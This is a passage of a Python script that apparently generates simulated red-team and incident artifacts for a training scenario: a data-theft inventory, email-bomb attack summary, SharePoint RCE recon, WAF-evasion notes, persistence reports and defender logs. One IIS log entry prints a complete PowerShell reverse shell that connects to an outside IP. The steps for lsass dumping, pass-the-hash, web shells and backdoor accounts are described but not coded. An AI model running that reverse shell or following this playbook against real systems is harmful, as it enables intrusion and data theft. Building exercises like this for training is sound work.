    """Create stolen data inventory for Red Team."""
    content = """Stolen Data Inventory
==========================
Operation: DATA THEFT
Date: 2024-01-15
Status: COMPLETE

High-Value Data Stolen:
-----------------------
1. Customer PII: 45,000 records
   Content:
     - Full names
     - Physical addresses
     - Email addresses
     - Phone numbers
     - Purchase history
     - Account details
   
   Format: CSV export
   Size: 1.8 GB
   Estimated Value: $2.25M
   Market Value: $50-100 per record
   Total Market Value: $2.25M - $4.5M

2. Financial Records: Q4 2023
   Content:
     - Revenue reports: $12.5M Q4 revenue
     - Budget forecasts: 2024 projections
     - Vendor contracts: Confidential agreements
     - Payment records: Transaction details
   
   Format: PDF reports
   Size: 450 MB
   Estimated Value: $5M+
   Use Cases: Competitive intelligence, fraud

3. Business Intelligence
   Content:
     - Strategic plans: 2024 roadmap
     - Market analysis: Competitive landscape
     - M&A discussions: Potential acquisitions
     - Business documents: 2,100 files
   
   Format: Documents, presentations
   Size: 250 MB
   Estimated Value: $10M+
   Use Cases: Competitive advantage, insider trading

Total Stolen Data:
------------------
Volume: 2.5 GB
Records: 45,000+ customer records
Files: 2,100+ business documents
Reports: 12 financial reports
Estimated Total Value: $17M+

Data Classification:
--------------------
Customer PII: HIGH RISK (GDPR, CCPA)
Financial Data: CONFIDENTIAL
Business Intelligence: PROPRIETARY
Regulatory Impact: SIGNIFICANT

Potential Uses:
---------------
1. Identity theft: Customer PII
2. Fraud: Financial records
3. Competitive advantage: Business intelligence
4. Extortion: Threaten disclosure
5. Resale: Dark web markets

Status: ALL DATA SUCCESSFULLY EXFILTRATED
"""
    with open(ARTIFACTS_DIR / "stolen_data_inventory_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: stolen_data_inventory_phase5.txt")


def create_attack_summary_eb():
    """Create attack summary for Red Team."""
    content = """Attack Summary - Mission Accomplished
==========================================
Operation: Email Bomb & Social Engineering
Target: executive@corp.local
Status: COMPLETE SUCCESS

Timeline:
---------
[09:15:00] Phase 1: Email Bomb Deployment
  - 8,247 emails sent
  - 94.2% delivery success rate
  - Target inbox overwhelmed
  - Status: SUCCESS ✓

[09:45:00] Phase 2: Social Engineering Call
  - Support call initiated
  - Trust established
  - Fake portal accessed
  - Status: SUCCESS ✓

[10:00:00] Phase 3: Credential Harvesting
  - Credentials captured
  - Systems tested
  - Access verified
  - Status: SUCCESS ✓

[10:15:00] Phase 4: Initial Access & Intelligence
  - Email accessed
  - Systems mapped
  - Data identified
  - Status: SUCCESS ✓

[10:30:00] Phase 5: Data Exfiltration
  - 2.5 GB data stolen
  - Customer PII: 45,000 records
  - Financial records: Q4 2023
  - Business intelligence: 2,100 files
  - Status: SUCCESS ✓

[12:30:00] Mission Complete

Results:
--------
✓ Email bomb successful (8,247 emails)
✓ Social engineering successful (12-minute call)
✓ Credentials harvested (executive@corp.local)
✓ Full system access obtained
✓ 2.5 GB data exfiltrated
✓ Persistence mechanisms deployed
✓ Estimated data value: $17M+

Systems Compromised:
--------------------
✓ Email (OWA): Full access
✓ VPN: Connected
✓ File Shares: Read/Write access
✓ CRM System: Full access
✓ Financial Portal: Read access

Data Stolen:
------------
- Customer PII: 45,000 records (1.8 GB)
- Financial Records: Q4 2023 (450 MB)
- Business Intelligence: 2,100 files (250 MB)
- Total: 2.5 GB
- Estimated Value: $17M+

Persistence:
-----------
✓ Email forwarding: Active
✓ Calendar monitoring: Active
✓ Contact export: Complete
✓ Session maintenance: Active

Detection Status:
-----------------
Network monitoring: May have detected transfers
Account isolation: Possible (monitoring)
Password reset: Possible (prepared)
Overall risk: LOW (mission complete)

Status: ATTACK COMPLETE - DATA SECURED - PERSISTENCE MAINTAINED
"""
    with open(ARTIFACTS_DIR / "attack_summary_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: attack_summary_phase5.txt")


# SharePoint RCE scenario artifact generation functions

def create_sharepoint_advisory():
    """Create Microsoft security advisory email."""
    content = """Microsoft Security Advisory ADV240001
==========================================
Subject: Critical RCE Vulnerability in SharePoint Server
Date: 2024-01-15 14:30:00 UTC
From: security@microsoft.com
To: security-alerts@corp.local

MICROSOFT SECURITY ADVISORY
Critical Remote Code Execution Vulnerability

CVE-2024-XXXXX
CVSS Score: 9.8 (Critical)
Severity: Critical

AFFECTED PRODUCTS:
- Microsoft SharePoint Server 2019
- Microsoft SharePoint Online
- Microsoft SharePoint Foundation 2013 (if applicable)

VULNERABILITY DETAILS:
A critical remote code execution vulnerability exists in Microsoft SharePoint Server. 
An attacker could exploit this vulnerability by sending a specially crafted HTTP request 
to an affected SharePoint server. Successful exploitation could allow the attacker to 
execute arbitrary code in the context of the SharePoint application pool.

ATTACK VECTOR:
Network (unauthenticated)
Attack Complexity: Low
Privileges Required: None
User Interaction: None

EXPLOITABILITY:
- Exploit Code Maturity: Functional exploit exists
- Remediation Level: Official fix not yet available
- Report Confidence: Confirmed
- Active Exploitation: YES - Exploitation detected in the wild

MITIGATION:
Microsoft is working on a security update. In the meantime, organizations should:

1. Restrict network access to SharePoint servers
   - Use firewall rules to limit access
   - Implement network segmentation
   - Consider taking servers offline if not critical

2. Implement Web Application Firewall (WAF) rules
   - Block suspicious HTTP request patterns
   - Monitor for exploitation attempts
   - Review WAF logs regularly

3. Enhanced monitoring
   - Monitor SharePoint IIS logs for suspicious requests
   - Enable detailed logging on SharePoint servers
   - Set up alerts for unusual process activity

4. Apply principle of least privilege
   - Review SharePoint service account permissions
   - Limit application pool privileges where possible

PATCH STATUS:
Microsoft is working on an emergency security update. Expected release: 
Within 24-48 hours. Organizations should prepare for immediate patching.

ADDITIONAL INFORMATION:
- Security Update Guide: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-XXXXX
- Microsoft Security Response Center: https://msrc.microsoft.com
- Report security issues: secure@microsoft.com

RECOMMENDED ACTIONS:
1. Immediately assess if your SharePoint servers are affected
2. Review and implement mitigation measures
3. Monitor for exploitation attempts
4. Prepare for emergency patching when update is available
5. Review incident response procedures

This is a critical vulnerability with active exploitation. Immediate action is required.

Microsoft Security Response Center
"""
    filepath = ARTIFACTS_DIR / "sharepoint_advisory_phase1.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_sharepoint_version():
    """Create SharePoint version detection log."""
    content = """SharePoint Server Version Detection Report
==================================================
Scan Date: 2024-01-15 14:45:00 UTC
Target: sharepoint.corp.com
Scanner: Nmap + Custom SharePoint Enumeration Script

SERVER INFORMATION:
-------------------
Hostname: sharepoint.corp.com
IP Address: 203.0.113.45
Product: Microsoft SharePoint Server 2019
Version: 16.0.10396.20000
Build: 16.0.10396.20000
Patch Level: November 2023 Cumulative Update
Service Pack: None

VULNERABILITY STATUS:
--------------------
CVE-2024-XXXXX: VULNERABLE
CVSS Score: 9.8 (Critical)
Status: CONFIRMED VULNERABLE

The detected SharePoint version (16.0.10396.20000) is affected by 
CVE-2024-XXXXX. This version does not include the security patch.

EXPOSED ENDPOINTS:
------------------
The following SharePoint endpoints are accessible from the internet:

✓ /_layouts/15/upload.aspx
  - Status: EXPOSED
  - Authentication: Forms-based
  - Risk: HIGH - Known exploit path

✓ /_vti_bin/
  - Status: EXPOSED
  - Authentication: Forms-based
  - Risk: MEDIUM

✓ /_layouts/15/start.aspx
  - Status: EXPOSED
  - Authentication: Forms-based
  - Risk: MEDIUM

✓ /_api/
  - Status: EXPOSED
  - Authentication: Forms-based
  - Risk: MEDIUM

✓ /_layouts/15/
  - Status: EXPOSED
  - Authentication: Forms-based
  - Risk: HIGH

AUTHENTICATION CONFIGURATION:
------------------------------
Authentication Method: Forms-based authentication
Multi-Factor Authentication: NOT ENABLED
Guest Access: ENABLED
Anonymous Access: DISABLED

EXTERNAL ACCESS:
----------------
Internet-Facing: YES
WAF Protection: Enabled (Cloudflare)
WAF Rules: Basic protection enabled
WAF Bypass Risk: MEDIUM - Some evasion techniques may work

NETWORK CONFIGURATION:
----------------------
Firewall Rules: Port 80, 443 open to internet
Network Segmentation: LIMITED
Internal Network Access: Full access to internal network

RECOMMENDATIONS:
---------------
1. IMMEDIATE: Apply emergency patch when available (expected 24-48 hours)
2. IMMEDIATE: Implement additional WAF rules for SharePoint-specific attacks
3. HIGH PRIORITY: Consider taking server offline if not business-critical
4. HIGH PRIORITY: Implement network segmentation
5. MEDIUM PRIORITY: Enable MFA for SharePoint administrators
6. MEDIUM PRIORITY: Review and restrict guest access

RISK ASSESSMENT:
---------------
Overall Risk: CRITICAL
- Vulnerability: Critical (CVSS 9.8)
- Exploitability: High (exploit exists, active exploitation)
- Impact: Critical (RCE, potential data breach)
- Business Impact: HIGH - External-facing system with sensitive data

IMMEDIATE ACTION REQUIRED
"""
    filepath = ARTIFACTS_DIR / "sharepoint_version_phase1.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_recon_report():
    """Create Red Team reconnaissance report."""
    content = """SharePoint Reconnaissance Report
====================================
Target: sharepoint.corp.com
Date: 2024-01-15 14:35 - 15:40 UTC
Operator: Red Team Operator 1

RECONNAISSANCE SUMMARY:
-----------------------
Target identified: sharepoint.corp.com
Status: VULNERABLE TO CVE-2024-XXXXX
Exploitation Feasibility: HIGH

VERSION INFORMATION:
--------------------
Product: Microsoft SharePoint Server 2019
Version: 16.0.10396.20000
Build: 16.0.10396.20000
Patch Level: November 2023 CU
CVE-2024-XXXXX Status: CONFIRMED VULNERABLE

The target is running a vulnerable version of SharePoint Server 2019.
The November 2023 CU does not include the fix for CVE-2024-XXXXX.

EXPOSED ENDPOINTS IDENTIFIED:
------------------------------
✓ /_layouts/15/upload.aspx
  - Status: ACCESSIBLE
  - Authentication: Forms-based (no MFA)
  - Exploit Path: CONFIRMED
  - Notes: Primary target for RCE exploit

✓ /_vti_bin/
  - Status: ACCESSIBLE
  - Authentication: Forms-based
  - Exploit Path: POSSIBLE
  - Notes: Alternative endpoint for testing

✓ /_api/
  - Status: ACCESSIBLE
  - Authentication: Forms-based
  - Exploit Path: POSSIBLE
  - Notes: REST API endpoint

✓ /_layouts/15/start.aspx
  - Status: ACCESSIBLE
  - Authentication: Forms-based
  - Exploit Path: POSSIBLE
  - Notes: Standard SharePoint page

AUTHENTICATION ANALYSIS:
------------------------
Authentication Method: Forms-based authentication
MFA Requirement: NONE DETECTED
Guest Access: ENABLED
Anonymous Access: DISABLED

The lack of MFA and guest access increases attack surface.

WAF ANALYSIS:
-------------
WAF Provider: Cloudflare
WAF Status: ACTIVE
WAF Rules: Basic protection enabled

WAF Bypass Techniques Tested:
- Base64 encoding: PARTIALLY EFFECTIVE
- URL encoding: PARTIALLY EFFECTIVE
- HTTP header manipulation: TESTING
- Request fragmentation: TESTING

Initial WAF blocks detected, but evasion techniques show promise.
Some requests are being allowed through.

VULNERABILITY TESTING:
----------------------
CVE-2024-XXXXX Testing: COMPLETED
Exploit Payload: PREPARED
Test Results: VULNERABLE CONFIRMED

Exploit payload has been prepared and tested against the target.
The vulnerability is confirmed exploitable.

NEXT STEPS:
-----------
1. Execute RCE exploit against /_layouts/15/upload.aspx
2. Establish reverse shell connection
3. Begin post-exploitation enumeration
4. Escalate privileges to farm administrator
5. Deploy persistence mechanisms

READY FOR EXPLOITATION
"""
    filepath = ARTIFACTS_DIR / "recon_report_phase1.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_vuln_verification():
    """Create vulnerability verification status."""
    content = """Vulnerability Verification Status
===================================
CVE-2024-XXXXX Verification Report
Target: sharepoint.corp.com
Date: 2024-01-15 15:40:00 UTC

VULNERABILITY STATUS:
---------------------
CVE-2024-XXXXX: CONFIRMED VULNERABLE
CVSS Score: 9.8 (Critical)
Exploitability: HIGH

TARGET INFORMATION:
-------------------
Hostname: sharepoint.corp.com
IP Address: 203.0.113.45
SharePoint Version: 16.0.10396.20000
Patch Level: November 2023 CU
Vulnerability Status: AFFECTED

TEST RESULTS:
-------------
Version Check: ✓ VULNERABLE
Endpoint Accessibility: ✓ CONFIRMED
Exploit Path: ✓ IDENTIFIED
WAF Bypass: ✓ TESTED (partial success)

EXPLOIT PATH:
-------------
Primary Target: /_layouts/15/upload.aspx
Method: HTTP POST with crafted payload
Authentication: Not required (unauthenticated RCE)
Payload Encoding: Base64 + URL encoding

WAF EVASION:
------------
Initial WAF Response: BLOCKED (some requests)
Evasion Technique: Base64 encoding + header manipulation
Evasion Success Rate: ~60% (sufficient for exploitation)

PAYLOAD STATUS:
--------------
Exploit Payload: PREPARED
Payload Size: 8,432 bytes
Encoding: Base64 + URL encoding
Test Execution: READY

NEXT STEPS:
-----------
1. Execute RCE payload
2. Establish reverse shell (185.220.101.45:4444)
3. Begin post-exploitation
4. Enumerate server environment
5. Escalate privileges

STATUS: READY FOR EXPLOITATION
"""
    filepath = ARTIFACTS_DIR / "vuln_verification_phase1.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_waf_alert():
    """Create WAF alert log."""
    content = """Cloudflare WAF Alert Log
==========================
Alert ID: CF-WAF-2024-0115-154218
Timestamp: 2024-01-15 15:42:18 UTC
Target: sharepoint.corp.com
Source IP: 185.220.101.45

ALERT DETAILS:
--------------
Request Method: POST
Request Path: /_layouts/15/upload.aspx
Request Size: 8,432 bytes
Source IP: 185.220.101.45
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

SUSPICIOUS INDICATORS:
----------------------
1. Base64 Encoded Data in Request Body
   - Large base64-encoded payload detected
   - Unusual for normal SharePoint requests
   - Pattern matches known exploit attempts

2. Unusual HTTP Headers
   - X-Forwarded-For header manipulation
   - Unusual Content-Type variations
   - Missing standard SharePoint headers

3. Request Pattern
   - Multiple rapid requests from same IP
   - Request size significantly larger than normal
   - Unusual parameter structure

WAF ACTIONS:
------------
Initial Requests (15:42:18 - 15:42:22):
- Request 1: BLOCKED (Rule: OWASP-001)
- Request 2: BLOCKED (Rule: OWASP-001)
- Request 3: BLOCKED (Rule: OWASP-001)

Subsequent Requests (15:42:23 - 15:42:25):
- Request 4: ALLOWED (evasion successful)
- Request 5: ALLOWED (evasion successful)
- Request 6: ALLOWED (evasion successful)

WAF RULE EFFECTIVENESS:
-----------------------
Rule OWASP-001: PARTIALLY EFFECTIVE
- Initial blocks successful
- Evasion techniques bypassed some rules
- Some requests allowed through

SEVERITY ASSESSMENT:
--------------------
Severity: CRITICAL
Confidence: HIGH
Threat Type: Remote Code Execution Attempt
Status: EXPLOITATION ATTEMPT DETECTED

RECOMMENDATION:
---------------
IMMEDIATE ACTION REQUIRED:
1. Block source IP: 185.220.101.45
2. Review all requests from this IP
3. Check SharePoint server for compromise
4. Isolate server if compromise confirmed
5. Review WAF rules for improvement

This appears to be an active exploitation attempt of CVE-2024-XXXXX.
"""
    filepath = ARTIFACTS_DIR / "waf_alert_phase2.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_iis_logs():
    """Create SharePoint IIS logs showing RCE execution."""
    content = """IIS Log Excerpt - SharePoint Server
=====================================
Server: SP-SRV-01 (sharepoint.corp.com)
Log Date: 2024-01-15
Time Zone: UTC

TIMESTAMP          IP              METHOD PATH                    STATUS SIZE
2024-01-15 15:42:18 185.220.101.45 POST   /_layouts/15/upload.aspx 200  8432
2024-01-15 15:42:20 185.220.101.45 POST   /_layouts/15/upload.aspx 200  1250
2024-01-15 15:42:22 185.220.101.45 POST   /_layouts/15/upload.aspx 200  890
2024-01-15 15:42:25 185.220.101.45 POST   /_layouts/15/upload.aspx 200  8432
2024-01-15 15:42:26 185.220.101.45 POST   /_layouts/15/upload.aspx 200  1250
2024-01-15 15:42:28 185.220.101.45 GET    /_vti_bin/             200  512
2024-01-15 15:42:30 185.220.101.45 GET    /_api/web                200  2048

PROCESS ACTIVITY DETECTED:
---------------------------
Time: 2024-01-15 15:42:26 UTC
Process Tree:
  w3wp.exe (PID 4821) - SharePoint Application Pool
    └─ cmd.exe (PID 4923) - Spawned by w3wp.exe
        └─ powershell.exe (PID 4924) - Spawned by cmd.exe

Command Executed:
powershell.exe -enc [BASE64_ENCODED_COMMAND]

Decoded Command:
$client = New-Object System.Net.Sockets.TCPClient('185.220.101.45',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

NETWORK CONNECTION:
-------------------
Process: powershell.exe (PID 4924)
Source: SP-SRV-01 (10.0.5.12)
Destination: 185.220.101.45:4444
Protocol: TCP
Connection Status: ESTABLISHED
Connection Time: 2024-01-15 15:42:28 UTC

ANALYSIS:
---------
Status: RCE EXPLOITATION CONFIRMED
Impact: Code execution achieved on SP-SRV-01
User Context: IIS AppPool\\SharePoint
Privileges: Medium (not administrator)

The logs show clear evidence of:
1. Successful RCE exploitation via /_layouts/15/upload.aspx
2. PowerShell reverse shell establishment
3. Outbound C2 connection to 185.220.101.45:4444

IMMEDIATE ACTION REQUIRED:
- Isolate SP-SRV-01 from network
- Block outbound connections to 185.220.101.45
- Preserve memory dump for forensic analysis
- Review all process activity on SP-SRV-01
"""
    filepath = ARTIFACTS_DIR / "iis_logs_phase2.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_exploit_success():
    """Create Red Team exploitation success report."""
    content = """RCE Exploitation Status: SUCCESS
===================================
Target: sharepoint.corp.com (SP-SRV-01)
Vulnerability: CVE-2024-XXXXX
Date: 2024-01-15 15:42:26 UTC

EXPLOITATION TIMELINE:
----------------------
15:42:18 UTC - Initial payload sent
15:42:20 UTC - WAF evasion successful
15:42:25 UTC - RCE achieved
15:42:26 UTC - Reverse shell established
15:42:28 UTC - C2 connection confirmed

ACCESS CONFIRMED:
-----------------
✓ Code execution on SP-SRV-01
✓ Reverse shell active (PID 4924)
✓ Running as: IIS AppPool\\SharePoint
✓ Network connectivity confirmed
✓ Domain membership: CORP.local

POST-EXPLOITATION STATUS:
-------------------------
Server Enumeration: IN PROGRESS
- Hostname: SP-SRV-01
- OS: Windows Server 2019
- Domain: CORP.local
- Current User: IIS AppPool\\SharePoint
- Privileges: Medium (not admin)

Network Discovery: IN PROGRESS
- Domain Controller: DC-01 (10.0.5.1) - IDENTIFIED
- File Servers: FS-01 (10.0.5.20), FS-02 (10.0.5.21) - IDENTIFIED
- SQL Server: SP-SQL-01 (10.0.5.15) - IDENTIFIED

NEXT STEPS:
-----------
1. Complete server environment enumeration
2. Identify service accounts and credentials
3. Escalate to farm administrator privileges
4. Deploy persistence mechanisms
5. Begin lateral movement reconnaissance

STATUS: EXPLOITATION SUCCESSFUL - POST-EXPLOITATION IN PROGRESS
"""
    filepath = ARTIFACTS_DIR / "exploit_success_phase2.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_server_enum():
    """Create server environment enumeration report."""
    content = """Server Environment Enumeration Report
==========================================
Target: SP-SRV-01
Date: 2024-01-15 15:45:00 UTC
Operator: Red Team Operator 1

HOST INFORMATION:
----------------
Hostname: SP-SRV-01
Operating System: Windows Server 2019 Datacenter
OS Version: 10.0.17763 Build 17763
Domain: CORP.local
Domain Role: Member Server
Current User: IIS AppPool\\SharePoint
Privileges: Medium (not administrator)

INSTALLED SOFTWARE:
-------------------
Microsoft SharePoint Server 2019
- Version: 16.0.10396.20000
- Build: 16.0.10396.20000
- Patch Level: November 2023 CU

Microsoft SQL Server 2019
- Instance: SP-SQL-01\\SHAREPOINT
- Version: 15.0.2000.5
- Used for: SharePoint Content Database

.NET Framework 4.8
- Version: 4.8.4515.0
- Installed: Yes

NETWORK CONFIGURATION:
---------------------
IP Address: 10.0.5.12
Subnet: 10.0.5.0/24
Default Gateway: 10.0.5.1
DNS Servers: 10.0.5.1 (DC-01)

Network Discovery Results:
- Domain Controller: DC-01 (10.0.5.1) - IDENTIFIED
- File Servers: FS-01 (10.0.5.20), FS-02 (10.0.5.21) - IDENTIFIED
- SQL Server: SP-SQL-01 (10.0.5.15) - IDENTIFIED
- Backup Server: BACKUP-01 (10.0.5.30) - IDENTIFIED

SHAREPOINT FARM CONFIGURATION:
------------------------------
Farm Administrator: CORP\\svc_sharepoint
Service Accounts:
- CORP\\svc_sharepoint (Farm Admin)
- CORP\\svc_sql (SQL Service Account)
- CORP\\svc_search (Search Service Account)
- CORP\\svc_timer (Timer Service Account)

Site Collections: 45 identified
- /sites/CustomerPortal (largest, 45,000 documents)
- /sites/HR (12,000 documents)
- /sites/Finance (8,500 documents)
- /sites/RD (3,200 documents)
- [41 additional site collections]

NEXT STEPS:
-----------
1. Escalate to farm administrator privileges
2. Access service account credentials
3. Deploy persistence mechanisms
4. Access SharePoint site collections
5. Begin lateral movement to domain controller

STATUS: ENUMERATION COMPLETE - READY FOR PRIVILEGE ESCALATION
"""
    filepath = ARTIFACTS_DIR / "server_enum_phase2.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_privilege_escalation_log():
    """Create privilege escalation event logs."""
    content = """Windows Security Event Log - Privilege Escalation
==================================================
Server: SP-SRV-01
Date: 2024-01-15 16:15:00 UTC

EVENT ID 4624: SUCCESSFUL LOGON
--------------------------------
Account: CORP\\svc_sharepoint
Source: SP-SRV-01
Logon Type: 3 (Network)
Authentication Package: NTLM
Source Network Address: 10.0.5.12
Process ID: 4924 (powershell.exe)
Time: 2024-01-15 16:15:23 UTC

EVENT ID 4672: SPECIAL PRIVILEGES ASSIGNED
-------------------------------------------
Account: CORP\\svc_sharepoint
Privileges Assigned:
- SeDebugPrivilege
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
Time: 2024-01-15 16:15:25 UTC

EVENT ID 5136: DIRECTORY SERVICE OBJECT MODIFIED
-------------------------------------------------
Object: CN=SharePoint Farm Admins,OU=Groups,DC=CORP,DC=local
Modification Type: Member Added
New Member: CN=backdoor_user,CN=Users,DC=CORP,DC=local
Modifier: CORP\\svc_sharepoint
Time: 2024-01-15 16:16:10 UTC

SHAREPOINT ULS LOGS:
--------------------
Time: 2024-01-15 16:15:30 UTC
Event: Farm administrator account accessed
User: CORP\\svc_sharepoint
Action: Service account password modification
Status: SUCCESS

Time: 2024-01-15 16:16:05 UTC
Event: User added to Farm Administrators group
User: CORP\\backdoor_user
Action: Group membership modification
Status: SUCCESS

Time: 2024-01-15 16:16:15 UTC
Event: Scheduled task created
Task Name: SharePointUpdate
Schedule: Every 5 minutes
Status: SUCCESS

Time: 2024-01-15 16:16:20 UTC
Event: Web shell deployed
Location: /_layouts/15/shell1.aspx
Status: SUCCESS

ANALYSIS:
---------
Status: PRIVILEGE ESCALATION CONFIRMED

The logs show clear evidence of:
1. Service account (CORP\\svc_sharepoint) credential access
2. Privilege escalation to farm administrator
3. Backdoor account creation and addition to admin group
4. Persistence mechanism deployment (scheduled tasks, web shells)

IMMEDIATE ACTION REQUIRED:
- Revoke all compromised credentials
- Remove backdoor accounts
- Delete scheduled tasks
- Remove web shells
- Isolate server from network
"""
    filepath = ARTIFACTS_DIR / "privilege_escalation_phase3.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_persistence_detection():
    """Create persistence mechanism detection report."""
    content = """Persistence Mechanism Detection Report
==========================================
Server: SP-SRV-01
Scan Date: 2024-01-15 16:30:00 UTC
Scanner: Custom PowerShell Script + Manual Review

WEB SHELLS IDENTIFIED:
---------------------
1. /_layouts/15/shell1.aspx
   - File Size: 4,832 bytes
   - Created: 2024-01-15 16:16:20 UTC
   - Modified: 2024-01-15 16:16:20 UTC
   - Type: ASPX web shell with command execution
   - Status: ACTIVE

2. /_catalogs/masterpage/shell2.aspx
   - File Size: 5,124 bytes
   - Created: 2024-01-15 16:16:25 UTC
   - Modified: 2024-01-15 16:16:25 UTC
   - Type: ASPX web shell with file upload
   - Status: ACTIVE

3. /Style Library/shell3.aspx
   - File Size: 4,956 bytes
   - Created: 2024-01-15 16:16:30 UTC
   - Modified: 2024-01-15 16:16:30 UTC
   - Type: ASPX web shell with PowerShell execution
   - Status: ACTIVE

4. /_layouts/15/update.aspx
   - File Size: 5,342 bytes
   - Created: 2024-01-15 16:16:35 UTC
   - Modified: 2024-01-15 16:16:35 UTC
   - Type: ASPX web shell with reverse shell
   - Status: ACTIVE

5. /_catalogs/wp/shell4.aspx
   - File Size: 4,789 bytes
   - Created: 2024-01-15 16:16:40 UTC
   - Modified: 2024-01-15 16:16:40 UTC
   - Type: ASPX web shell with database access
   - Status: ACTIVE

SCHEDULED TASKS:
---------------
1. Task Name: SharePointUpdate
   - Schedule: Every 5 minutes
   - Command: powershell.exe -enc [ENCODED_COMMAND]
   - Created: 2024-01-15 16:16:15 UTC
   - Status: ACTIVE

2. Task Name: SystemMaintenance
   - Schedule: Hourly
   - Command: cmd.exe /c [COMMAND]
   - Created: 2024-01-15 16:16:18 UTC
   - Status: ACTIVE

3. Task Name: HealthCheck
   - Schedule: On system startup
   - Command: powershell.exe -File C:\\temp\\health.ps1
   - Created: 2024-01-15 16:16:22 UTC
   - Status: ACTIVE

BACKDOOR ACCOUNTS:
-----------------
1. Account: CORP\\backdoor_user
   - Created: 2024-01-15 16:16:05 UTC
   - Groups: SharePoint Farm Administrators
   - Status: ACTIVE
   - Last Logon: 2024-01-15 16:16:10 UTC

2. Account: CORP\\svc_temp
   - Modified: 2024-01-15 16:15:30 UTC
   - Password: Changed by attacker
   - Status: COMPROMISED

WMI EVENT SUBSCRIPTIONS:
-----------------------
1. Subscription: EventFilter1
   - Event: Process creation
   - Action: Execute PowerShell script
   - Status: ACTIVE

2. Subscription: EventFilter2
   - Event: System startup
   - Action: Execute scheduled task
   - Status: ACTIVE

REGISTRY MODIFICATIONS:
----------------------
1. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   - Key: SharePointUpdate
   - Value: powershell.exe -enc [ENCODED_COMMAND]
   - Status: ACTIVE

2. HKLM\\SYSTEM\\CurrentControlSet\\Services
   - Service: FakeService
   - ImagePath: C:\\temp\\service.exe
   - Status: ACTIVE

RECOMMENDATION:
--------------
IMMEDIATE REMOVAL REQUIRED:
1. Delete all 5 web shell files
2. Remove all 3 scheduled tasks
3. Delete backdoor accounts
4. Remove WMI event subscriptions
5. Revert registry modifications
6. Reset all compromised service account passwords
"""
    filepath = ARTIFACTS_DIR / "persistence_detection_phase3.pdf"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_privilege_status():
    """Create Red Team privilege escalation status."""
    content = """Privilege Escalation Status: SUCCESS
====================================
Target: SP-SRV-01
Date: 2024-01-15 16:16:00 UTC

METHOD: Service Account Credential Access
------------------------------------------
Target Account: CORP\\svc_sharepoint
Privileges Obtained: Farm Administrator
Access Method: Memory dump (lsass.exe) + Pass-the-Hash

ACTIONS COMPLETED:
-----------------
✓ Farm admin account accessed
✓ Service account passwords modified
✓ Backdoor account created: CORP\\backdoor_user
✓ Added to SharePoint Farm Admins group
✓ Full farm access confirmed

PERSISTENCE DEPLOYED:
---------------------
✓ Web shells: 5 locations
  - /_layouts/15/shell1.aspx
  - /_catalogs/masterpage/shell2.aspx
  - /Style Library/shell3.aspx
  - /_layouts/15/update.aspx
  - /_catalogs/wp/shell4.aspx

✓ Scheduled tasks: 3 tasks
  - SharePointUpdate (5 min interval)
  - SystemMaintenance (hourly)
  - HealthCheck (on startup)

✓ WMI subscriptions: 2 active
✓ Registry modifications: 2 locations

LATERAL MOVEMENT RECONNAISSANCE:
--------------------------------
Domain Controller: DC-01 (10.0.5.1) - IDENTIFIED
File Servers: FS-01 (10.0.5.20), FS-02 (10.0.5.21) - IDENTIFIED
SQL Server: SP-SQL-01 (10.0.5.15) - IDENTIFIED
Backup Server: BACKUP-01 (10.0.5.30) - IDENTIFIED

STATUS: READY FOR DATA ACCESS PHASE
"""
    filepath = ARTIFACTS_DIR / "privilege_status_phase3.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_persistence_deployment():
    """Create Red Team persistence deployment report."""
    content = """Persistence Deployment Status: COMPLETE
==========================================
Target: SP-SRV-01
Date: 2024-01-15 16:20:00 UTC

WEB SHELLS DEPLOYED:
--------------------
✓ /_layouts/15/shell1.aspx - ACTIVE
✓ /_catalogs/masterpage/shell2.aspx - ACTIVE
✓ /Style Library/shell3.aspx - ACTIVE
✓ /_layouts/15/update.aspx - ACTIVE
✓ /_catalogs/wp/shell4.aspx - ACTIVE

All web shells tested and confirmed functional.
Multiple locations ensure redundancy.

SCHEDULED TASKS:
----------------
✓ SharePointUpdate
  - Schedule: Every 5 minutes
  - Status: ACTIVE
  - Tested: SUCCESS

✓ SystemMaintenance
  - Schedule: Hourly
  - Status: ACTIVE
  - Tested: SUCCESS

✓ HealthCheck
  - Schedule: On system startup
  - Status: ACTIVE
  - Tested: SUCCESS

BACKDOOR ACCOUNTS:
------------------
✓ CORP\\backdoor_user
  - Groups: SharePoint Farm Administrators
  - Status: ACTIVE
  - Access Verified: SUCCESS

✓ CORP\\svc_temp
  - Password: Modified
  - Status: COMPROMISED
  - Access Verified: SUCCESS

WMI SUBSCRIPTIONS: 2 active
REGISTRY PERSISTENCE: 2 locations

ALL PERSISTENCE MECHANISMS ACTIVE
Access maintained even if primary shell discovered.
"""
    filepath = ARTIFACTS_DIR / "persistence_deployment_phase3.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_sharepoint_access_log():
    """Create SharePoint access audit logs."""
    content = """SharePoint Access Audit Logs
===============================
Server: SP-SRV-01
Date Range: 2024-01-15 15:50 - 18:30 UTC
User: CORP\\backdoor_user

UNAUTHORIZED ACCESS DETECTED:
-----------------------------

